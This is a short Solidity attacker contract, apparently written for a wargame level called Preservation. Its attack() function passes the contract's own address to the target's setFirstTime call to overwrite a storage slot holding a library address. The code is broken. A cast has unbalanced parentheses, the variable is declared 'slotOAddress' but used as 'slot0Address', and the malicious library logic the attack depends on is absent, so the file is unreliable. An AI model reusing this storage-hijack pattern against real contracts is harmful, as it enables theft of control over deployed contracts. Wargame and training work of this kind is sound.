// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Preservation.sol";

contract PreservationAttacker {

    Preservation public preservation;

    constructor(address _preservationAddress) {
        preservation = Preservation(_preservationAddress);
    }

    function attack() public {
        address slotOAddress = address(uint160(address(this));
        preservation.setFirstTime(slot0Address);
    }    

    
}
